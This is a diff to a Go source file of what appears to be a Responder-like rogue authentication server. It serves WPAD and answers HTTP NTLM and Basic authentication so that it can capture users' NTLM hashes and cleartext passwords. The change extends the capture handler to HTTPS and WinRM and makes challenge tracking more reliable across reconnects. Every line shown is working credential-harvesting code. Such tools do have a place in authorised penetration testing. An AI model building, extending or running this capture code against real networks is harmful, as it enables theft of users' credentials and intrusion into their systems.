@@ -14,6 +14,16 @@ import (
 
 var connChallenges sync.Map
 
+// clientHost returns just the IP of a "host:port" remote address so that the
+// NTLM challenge survives a client reconnecting between the Type1 and Type3
+// messages, and so abandoned handshakes do not leak one map entry per socket.
+func clientHost(remoteAddr string) string {
+	if host, _, err := net.SplitHostPort(remoteAddr); err == nil {
+		return host
+	}
+	return remoteAddr
+}
+
 func ServeHTTP(ifaceIP net.IP) {
 	mux := http.NewServeMux()
 	if core.WPADEnabled {
@@ -58,6 +68,12 @@ func handleWPAD(w http.ResponseWriter, r *http.Request) {
 }
 
 func HandleHTTPNTLM(w http.ResponseWriter, r *http.Request) {
+	handleHTTPNTLM(w, r, "HTTP")
+}
+
+// handleHTTPNTLM implements the NTLM/Basic capture flow. proto is the label
+// used in capture output so the same handler can serve HTTP, HTTPS and WinRM.
+func handleHTTPNTLM(w http.ResponseWriter, r *http.Request, proto string) {
 	io.Copy(io.Discard, r.Body)
 
 	auth := r.Header.Get("Authorization")
@@ -82,7 +98,7 @@ func HandleHTTPNTLM(w http.ResponseWriter, r *http.Request) {
 			if i := strings.Index(user, "\\"); i >= 0 {
 				dom, user = user[:i], user[i+1:]
 			}
-			core.SaveCleartext("HTTP", r.RemoteAddr, user, dom, pass)
+			core.SaveCleartext(proto, r.RemoteAddr, user, dom, pass)
 		}
 		w.Header().Set("WWW-Authenticate", "NTLM")
 		w.WriteHeader(401)
@@ -116,7 +132,7 @@ func HandleHTTPNTLM(w http.ResponseWriter, r *http.Request) {
 			core.LogVerbose("HTTP NTLM Type1 from %s - issuing challenge", r.RemoteAddr)
 		}
 		challenge := core.GetChallenge()
-		connChallenges.Store(r.RemoteAddr, challenge)
+		connChallenges.Store(clientHost(r.RemoteAddr), challenge)
 		ntlmChallenge := core.BuildNTLMChallenge(challenge, core.SessionDomain, core.SessionMachineName)
 		encoded := base64.StdEncoding.EncodeToString(ntlmChallenge)
 		w.Header().Set("WWW-Authenticate", "NTLM "+encoded)
@@ -124,13 +140,13 @@ func HandleHTTPNTLM(w http.ResponseWriter, r *http.Request) {
 		w.WriteHeader(401)
 
 	case 3:
-		val, ok := connChallenges.Load(r.RemoteAddr)
+		val, ok := connChallenges.Load(clientHost(r.RemoteAddr))
 		if !ok {
 			w.WriteHeader(401)
 			return
 		}
 		challenge := val.([8]byte)
-		connChallenges.Delete(r.RemoteAddr)
+		connChallenges.Delete(clientHost(r.RemoteAddr))
 
 		hash, user, domain, ntlmVer, err := core.ParseNTLMAuthenticate(ntlm, challenge)
 		if err != nil {
@@ -138,7 +154,7 @@ func HandleHTTPNTLM(w http.ResponseWriter, r *http.Request) {
 			w.WriteHeader(401)
 			return
 		}
-		core.SaveCapture("HTTP", r.RemoteAddr, user, domain, ntlmVer, hash)
+		core.SaveCapture(proto, r.RemoteAddr, user, domain, ntlmVer, hash)
 		w.Header().Set("WWW-Authenticate", "NTLM")
 		w.WriteHeader(401)
 
